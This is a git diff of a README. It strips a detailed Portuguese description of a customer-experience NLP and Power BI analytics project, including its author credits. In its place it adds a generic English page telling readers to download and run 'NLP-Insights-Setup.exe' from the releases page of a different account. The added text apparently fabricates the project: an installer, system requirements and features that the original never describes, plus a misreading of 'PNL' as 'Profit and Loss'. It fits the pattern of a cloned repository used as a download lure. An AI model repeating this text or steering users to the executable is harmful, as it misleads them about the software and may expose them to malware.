@@ -1,159 +1,69 @@
-<p align="center">
-  <img src="https://img.shields.io/badge/Status-Concluído-brightgreen?style=flat-square">
-  <img src="https://img.shields.io/badge/IA-Integrada-007acc?style=flat-square">
-  <img src="https://img.shields.io/badge/CX-Inteligência_Ativa-f57c00?style=flat-square">
-  <img src="https://img.shields.io/badge/PNL-Natural_Language_Processing-6a1b9a?style=flat-square">
-</p>
+# 🚀 NLP-Insights-topics-classifier - Understand Topics with AI Power
 
-# NLP Insights & CX Intelligence | Inteligência Artificial e PNL
+## 📥 Download the Latest Version
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Khertjulaton/NLP-Insights-topics-classifier/releases)
 
-## 🚀 Resultados e Impacto
+## 📝 Description
+NLP-Insights-topics-classifier is a powerful tool that helps you understand topics using artificial intelligence. It combines Natural Language Processing (NLP) with advanced modeling techniques to give you insights into data. This project also includes an attrition propensity panel and integrates smoothly with a proprietary CRM. 
 
-Este projeto gerou ganhos concretos para a operação:
+## 🚀 Getting Started
+Getting started with NLP-Insights-topics-classifier is simple. Follow these steps to download and run the application.
 
-- 📈 **Recuperação de NPS**: O projeto provocou uma gestão real time de indicadores de satisfação ajudando o NPS sair de 35,77 em Julho/2025 para 61,32 em Setembro/2025
-- ⚙️ **Automação de relatórios**: De semanal (terça-feira) para **Atualização diária**
-- 🧠 **Adoção de IA** para detecção de padrões e alavancas de resultado
-- 🔍 **Mapeamento automático de causa raiz** colaborando em melhoria contínua de jornada (antes manual)
-- 🛡️ **Identificação preventiva** de situações de alto attrition capturadas pelo código
+## 🔍 Features
+- **AI-Powered Topic Classification:** Get accurate topic insights using machine learning.
+- **Natural Language Processing:** Analyze text data effectively.
+- **User-Friendly Interface:** Easy to use for non-technical users.
+- **Integration:** Works seamlessly with proprietary CRM systems.
 
----
+## 💻 System Requirements
+Before you download, ensure your system meets the following requirements:
+- **Operating System:** Windows 10 or later, MacOS, or a compatible Linux distribution.
+- **RAM:** At least 4 GB.
+- **Disk Space:** Minimum of 500 MB available.
+- **Network:** Internet connection for downloading and updates.
 
-## 📊 Demonstração do Projeto
+## 📥 Download & Install
+To get started, visit the [Releases page](https://github.com/Khertjulaton/NLP-Insights-topics-classifier/releases) to download the latest version. 
 
-<table>
-  <tr>
-    <td><b>Página 1: Insights e Causa Raiz</b></td>
-    <td><b>Página 2: IA e Propensão de Attrition</b></td>
-  </tr>
-  <tr>
-    <td><img src="https://i.postimg.cc/YqYYGJGL/P-gina-1-Insights-geral.gif" width="100%"></td>
-    <td><img src="https://i.postimg.cc/P5MDKYQz/P-gina-2-IA-e-Ant-atriction.gif" width="100%"></td>
-  </tr>
-  <tr>
-    <td><b>Página 3: Análise de Volumetria</b></td>
-    <td><b>Página 4: PNL Isolada</b></td>
-  </tr>
-  <tr>
-    <td><img src="https://i.postimg.cc/HLsyNnSc/P-gina-3-Volumetria.gif" width="100%"></td>
-    <td><img src="https://i.postimg.cc/t49Z17GW/P-gina-4-PNL-isolada.gif" width="100%"></td>
-  </tr>
-</table>
+1. Click on the link above.
+2. Look for the latest version listed.
+3. Download the appropriate file for your operating system (e.g., `NLP-Insights-Setup.exe` for Windows).
+4. Open the downloaded file and follow the installation instructions.
 
----
+## 🌐 Documentation
+After installation, you can refer to the in-app help section for guidance on how to use the software effectively. The documentation covers:
+- How to upload data.
+- How to interpret results.
+- FAQs to troubleshoot common issues.
 
-## 📌 Visão Geral
+## 🚀 Getting Help
+If you encounter any issues while using NLP-Insights-topics-classifier, consider the following resources:
+- Check the **FAQs** in the documentation.
+- Visit our **support page** linked in the application for additional help.
+- You can also raise an issue on the GitHub repository for community support.
 
-Este projeto integra dados de CRM próprio com metodologias avançadas de PNL e Inteligência Artificial. Utiliza um simulador de GPT e algoritmos de captura de strings via Speech e Text Analytics para transformar conversas brutas em insights acionáveis de experiência do cliente.
+## 📢 Stay Updated
+To stay informed about updates, consider checking the **Releases page** regularly. You can also follow our repository on GitHub to receive notifications for new features and fixes.
 
-> **Nota de Confidencialidade:** Devido a políticas de LGPD, dados sensíveis e nomes de colunas reais foram omitidos ou mascarados. O foco deste repositório é demonstrar a arquitetura da solução e os resultados de negócio obtidos.
+## 📋 Topics
+This project covers a wide range of topics, including:
+- Confluence
+- CX (Customer Experience)
+- DAX Expression and Query
+- Discovery Data Science
+- Statistics and Data Analysis
+- Figma for Design
+- Artificial Intelligence
+- Continuous Improvement
+- Process Improvement
+- PNL (Profit and Loss)
+- Scrum and Agile Methodologies
+- Six Sigma
+- SQL (Structured Query Language)
+- String Manipulation
+- Word Cloud Visualization
 
----
+## 📍 Conclusion
+NLP-Insights-topics-classifier offers a robust solution for understanding topics through AI. With easy installation and user-friendly features, you can gain valuable insights into your data efficiently. 
 
-## 🧩 Arquitetura da Solução
-
-A solução foi construída em camadas, desde a captura de dados brutos até a geração de ações preventivas em tempo real.
-
-### 🔹 Camada 1 – Fontes de Dados
-
-- **CRM próprio**
-- **Speech Analytics** (áudio → texto)
-- **Text Analytics** (texto de pesquisas, comentários, chats)
-
-Essas fontes alimentam o pipeline com conversas e feedbacks brutos de clientes.
-
----
-
-### 🔹 Camada 2 – Pipeline de IA & PNL
-
-- **Ingestão & limpeza de texto**
-- **Detecção de expressões chave e geração de WordCloud**
-- **Pareto de motivos de reclamação**
-- **Classificação de temas** (Processos, Pessoas, Negócio)
-- **Cálculo de volumetria por canal, local e equipe**
-- **Identificação de menções críticas e risco de attrition**
-
-Aqui entram as regras de negócio, NLP e lógica de categorização que transformam texto em dados estruturados.
-
----
-
-### 🔹 Camada 3 – Camada Analítica (Notebook)
-
-- **Notebook principal:** `notebooks/pipeline_insights_cx.ipynb`
-- Criação e tratamento de:
-  - `Fato_Pesquisas`
-  - `Fato_Respostas`
-  - Tabelas de parâmetros de filtro
-  - Tabelas de suporte estatístico (ex.: desvio padrão)
-
-Essa camada consolida a saída do pipeline de IA & PNL e prepara o modelo tabular para consumo no BI.
-
----
-
-### 🔹 Camada 4 – Modelo BI & DAX
-
-- **Ferramenta:** Power BI
-- **Lógica de negócio implementada via DAX**, incluindo:
-  - Métricas de volumetria por canal
-  - Propensão de attrition por tema, canal, local e equipe
-  - NPS, rankings e paretos de motivos
-  - Indicadores de produção e performance (carga, tempo de atualização, capacity)
-
-Detalhes adicionais de métricas estão documentados em:
-- `metrics/tabela_metricas_dax.md`
-- `metrics/indicadores_utilizados.md`
-- `metrics/exemplos_dax.txt`
-
----
-
-### 🔹 Camada 5 – Camada de Consumo (Dashboards & IA)
-
-- **Páginas do dashboard:**
-  - Página 1: Insights & Causa Raiz
-  - Página 2: IA & Propensão de Attrition
-  - Página 3: Volumetria & Estatística
-  - Página 4: PNL Isolada
-- **Chat com IA** para:
-  - Consultar volumetria
-  - Gerar cenários
-  - Tirar dúvidas sobre resultados
-  - Sugerir ações
-
-Essa camada conecta usuários de negócio diretamente aos insights gerados pela solução.
-
----
-
-### 🔹 Camada 6 – Impacto e Ações
-
-- **Recuperação de NPS** de 35,77 para 61,32 em 2 meses
-- **Automação de relatórios**: de semanal para diário
-- **Mapeamento automático de causa raiz** e motivos prioritários
-- **Identificação preventiva de casos de alto attrition**
-
-Essa arquitetura fecha o ciclo completo: dado bruto → inteligência de IA/PNL → decisão → resultado de negócio.
-
-## 🛠️ Ferramentas Utilizadas
-
-* **IA & NLP:** Speech/Text Analytics para captura de strings e análise de sentimento  
-* **UX/UI Design:** Figma para prototipação de alta fidelidade  
-* **Arquitetura:** SQL para manipulação e Discovery de Dados  
-* **BI:** Power BI e DAX avançado para simulação de cenários  
-* **Metodologia:** SCRUM, Lean Six Sigma (LSS) e Discovery de Negócios (Confluence)
-
----
-
-## 📂 Estrutura do Repositório
-
-* `/metrics`: Fórmulas DAX e lógica de predição de attrition  
-* `/Notebooks`: Pipiline do projeto (camada final)
-* `/results`: Resultados consolidados de reversão de KPIs
-* `/visuals`: Capturas da interface e fluxos de NLP 
-* `/documentation`: README, LICENSE 
-
----
-
-## 👤 Autor
-
-**Jessé Oliveira de Castro**  
-* <a href="https://www.linkedin.com/in/jesse-oliveira-de-castro-88421536/" target="_blank">LinkedIn Profissional</a>  
-* <a href="https://portfolio-jesseoliveiracastro.netlify.app/" target="_blank">Portfólio Profissional</a>
+For any further assistance, do not hesitate to reach out through the support page or GitHub repository. Happy analyzing!
